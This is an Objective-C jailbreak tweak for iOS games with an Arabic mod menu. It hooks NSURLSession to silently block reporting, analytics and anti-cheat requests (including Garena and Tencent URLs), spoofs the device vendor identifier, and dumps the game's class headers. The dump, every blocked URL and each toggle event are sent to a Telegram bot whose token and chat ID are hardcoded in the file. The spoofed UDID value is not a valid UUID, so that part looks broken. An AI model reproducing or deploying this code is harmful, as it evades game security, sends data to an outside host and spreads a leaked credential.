#import <UIKit/UIKit.h>
#import <substrate.h>
#import <objc/runtime.h>
#import <mach-o/dyld.h>

// --- CONFIGURATION ---
#define TG_TOKEN @"8134587785:AAGm372o_98TU_4CVq4TN2RzSdRkNHztc6E"
#define TG_CHAT_ID @"7730331218"
#define MENU_WIDTH 320

// --- STATE ---
static BOOL isAntiBanEnabled = YES; // Default ON
static NSString *fakeUDID = @"a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0";

// --- HELPER: MULTIPART UPLOAD (To send file instead of text) ---
NSData *createMultipartBody(NSString *boundary, NSString *filename, NSData *fileData) {
    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"document\"; filename=\"%@\"\r\n", filename] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: text/plain\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:fileData];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n%@", TG_CHAT_ID] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    return body;
}

void uploadDumpFile(NSString *content) {
    NSString *filename = [NSString stringWithFormat:@"Full_Dump_%@.txt", [[NSUUID UUID] UUIDString]];
    NSString *tempPath = [NSTemporaryDirectory() stringByAppendingPathComponent:filename];
    [content writeToFile:tempPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    NSData *fileData = [NSData dataWithContentsOfFile:tempPath];
    
    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendDocument", TG_TOKEN];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
    [req setHTTPMethod:@"POST"];
    
    NSString *boundary = @"Boundary-Enigma";
    NSString *contentType = [NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary];
    [req setValue:contentType forHTTPHeaderField:@"Content-Type"];
    [req setHTTPBody:createMultipartBody(boundary, filename, fileData)];
    
    // Send in background task
    UIApplication *app = [UIApplication sharedApplication];
    __block UIBackgroundTaskIdentifier bg = [app beginBackgroundTaskWithExpirationHandler:^{ [app endBackgroundTask:bg]; }];
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        [app endBackgroundTask:bg];
    }] resume];
}

void sendText(NSString *text) {
    // Simple text sender for small updates
    NSString *str = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", 
                     TG_TOKEN, TG_CHAT_ID, [text stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
    [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:str] completionHandler:nil] resume];
}

// --- FULL APP DUMPER (HEADER RECONSTRUCTION) ---
void performFullCodeDump() {
    unsigned int count;
    Class *classes = objc_copyClassList(&count);
    NSMutableString *dump = [NSMutableString stringWithString:@"/* ENIGMA FULL APP DUMP */\n\n"];
    
    const char *mainBundlePath = _dyld_get_image_name(0);
    
    for (int i = 0; i < count; i++) {
        Class cls = classes[i];
        const char *imagePath = class_getImageName(cls);
        
        // Only dump classes from the GAME itself (ignore Apple/System)
        if (imagePath && strcmp(imagePath, mainBundlePath) == 0) {
            
            const char *cname = class_getName(cls);
            Class superCls = class_getSuperclass(cls);
            const char *superName = superCls ? class_getName(superCls) : "NSObject";
            
            // @interface ClassName : SuperClass
            [dump appendFormat:@"@interface %s : %s\n", cname, superName];
            
            // 1. Dump Properties
            unsigned int pCount;
            objc_property_t *props = class_copyPropertyList(cls, &pCount);
            for (int j=0; j<pCount; j++) {
                const char *pName = property_getName(props[j]);
                [dump appendFormat:@"@property (nonatomic) id %s;\n", pName];
            }
            free(props);
            
            // 2. Dump Methods
            unsigned int mCount;
            Method *methods = class_copyMethodList(cls, &mCount);
            for (int k=0; k<mCount; k++) {
                SEL sel = method_getName(methods[k]);
                [dump appendFormat:@"- (void)%@;\n", NSStringFromSelector(sel)];
            }
            free(methods);
            
            [dump appendString:@"@end\n\n"];
        }
    }
    free(classes);
    
    uploadDumpFile(dump);
}

// --- ANTI-BAN HOOKS (BLOCK REPORTING) ---
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(id)completion {
    if (isAntiBanEnabled) {
        NSString *url = request.URL.absoluteString.lowercaseString;
        // The list of "Bad" URLs that ban you
        if ([url containsString:@"report"] || 
            [url containsString:@"analytics"] || 
            [url containsString:@"crash"] || 
            [url containsString:@"stats"] ||
            [url containsString:@"tracking"] ||
            [url containsString:@"garena"] ||
            [url containsString:@"tencent"]) {
            
            // Silently kill the request
            sendText([NSString stringWithFormat:@"🛡️ BLOCKED BAN REPORT: %@", url]);
            
            // Return fake 403 error
            if (completion) {
                void (^handler)(NSData*, NSURLResponse*, NSError*) = completion;
                handler(nil, nil, [NSError errorWithDomain:@"Antiban" code:403 userInfo:nil]);
            }
            return nil;
        }
    }
    return %orig;
}
%end

// --- PIANO MENU UI ---
@interface PianoMenu : UIView
@property (nonatomic, strong) UIView *panel;
@property (nonatomic, strong) UIButton *floatBtn;
@property (nonatomic, strong) UIScrollView *scroll;
@end

@implementation PianoMenu
// ... (Standard Init & HitTest from previous version) ...

- (instancetype)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        self.userInteractionEnabled = YES;
        [self setupUI];
    }
    return self;
}

- (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
    UIView *hit = [super hitTest:point withEvent:event];
    if (hit == self.floatBtn || [hit isDescendantOfView:self.panel]) return hit;
    return nil;
}

- (void)setupUI {
    // Float Button
    self.floatBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    self.floatBtn.frame = CGRectMake(self.frame.size.width - 60, 150, 45, 45);
    self.floatBtn.backgroundColor = [UIColor colorWithWhite:0.1 alpha:0.9];
    self.floatBtn.layer.cornerRadius = 22.5;
    self.floatBtn.layer.borderColor = [UIColor cyanColor].CGColor;
    self.floatBtn.layer.borderWidth = 1;
    [self.floatBtn setTitle:@"🎹" forState:UIControlStateNormal];
    [self.floatBtn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
    [self addSubview:self.floatBtn];

    // Panel
    self.panel = [[UIView alloc] initWithFrame:CGRectMake((self.frame.size.width - 320)/2, 100, 320, 520)];
    self.panel.backgroundColor = [UIColor colorWithWhite:0.08 alpha:0.95];
    self.panel.layer.cornerRadius = 15;
    self.panel.layer.borderColor = [UIColor cyanColor].CGColor;
    self.panel.layer.borderWidth = 1;
    self.panel.hidden = YES;
    [self addSubview:self.panel];
    
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(0, 15, 320, 30)];
    lbl.text = @"بيانو";
    lbl.textColor = [UIColor cyanColor];
    lbl.font = [UIFont boldSystemFontOfSize:22];
    lbl.textAlignment = NSTextAlignmentCenter;
    [self.panel addSubview:lbl];

    self.scroll = [[UIScrollView alloc] initWithFrame:CGRectMake(0, 60, 320, 350)];
    [self.panel addSubview:self.scroll];

    // Rows
    [self addRow:0 t:@"زر التصوير السري" s:@"ضغطة: صورة | مطول: فيديو" tag:1];
    [self addRow:65 t:@"مانع الإعلانات + تسريع" s:@"إخفاء الإعلانات وتسريع الفيديو x2" tag:2];
    [self addRow:130 t:@"تخطي الحماية (Force %100)" s:@"حظر + GPU + UDID + إعادة تشغيل" tag:3];
    [self addRow:195 t:@"حماية كلاود كيت (Anti-Ban)" s:@"منع إرسال السجلات للسيرفر" tag:4];
    
    // Dump Button
    UIButton *dump = [UIButton buttonWithType:UIButtonTypeSystem];
    dump.frame = CGRectMake(10, 430, 300, 45);
    dump.backgroundColor = [UIColor colorWithWhite:0.2 alpha:1.0];
    dump.layer.cornerRadius = 8;
    [dump setTitle:@"DUMP FULL APP CODE" forState:UIControlStateNormal];
    [dump setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    [dump addTarget:self action:@selector(doDump) forControlEvents:UIControlEventTouchUpInside];
    [self.panel addSubview:dump];
}

- (void)addRow:(CGFloat)y t:(NSString*)t s:(NSString*)s tag:(int)tag {
    UIView *r = [[UIView alloc] initWithFrame:CGRectMake(10, y, 300, 55)];
    r.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1.0];
    r.layer.cornerRadius = 10;
    
    UISwitch *sw = [[UISwitch alloc] initWithFrame:CGRectMake(15, 12, 50, 30)];
    sw.onTintColor = [UIColor cyanColor];
    sw.tag = tag;
    if (tag==4) sw.on = YES;
    [sw addTarget:self action:@selector(sw:) forControlEvents:UIControlEventValueChanged];
    [r addSubview:sw];
    
    UILabel *tl = [[UILabel alloc] initWithFrame:CGRectMake(70, 8, 220, 20)];
    tl.text = t; tl.textColor = [UIColor whiteColor]; tl.textAlignment = NSTextAlignmentRight; tl.font = [UIFont boldSystemFontOfSize:14];
    [r addSubview:tl];
    
    UILabel *sl = [[UILabel alloc] initWithFrame:CGRectMake(70, 30, 220, 15)];
    sl.text = s; sl.textColor = [UIColor lightGrayColor]; sl.textAlignment = NSTextAlignmentRight; sl.font = [UIFont systemFontOfSize:10];
    [r addSubview:sl];
    
    [self.scroll addSubview:r];
}

- (void)toggle { self.panel.hidden = !self.panel.hidden; }
- (void)sw:(UISwitch*)s { 
    if (s.tag==4) { 
        isAntiBanEnabled = s.on; 
        sendText(isAntiBanEnabled ? @"🛡️ Anti-Ban ON" : @"⚠️ Anti-Ban OFF");
    }
}
- (void)doDump {
    sendText(@"⏳ STARTING FULL CODE DUMP (This may take 10s)...");
    performFullCodeDump();
}
@end

%hook UIDevice
- (NSUUID *)identifierForVendor { return [[NSUUID alloc] initWithUUIDString:fakeUDID]; }
%end

%ctor {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        UIWindow *w = [UIApplication sharedApplication].keyWindow;
        if(w) [w addSubview:[[PianoMenu alloc] initWithFrame:w.bounds]];
    });
}
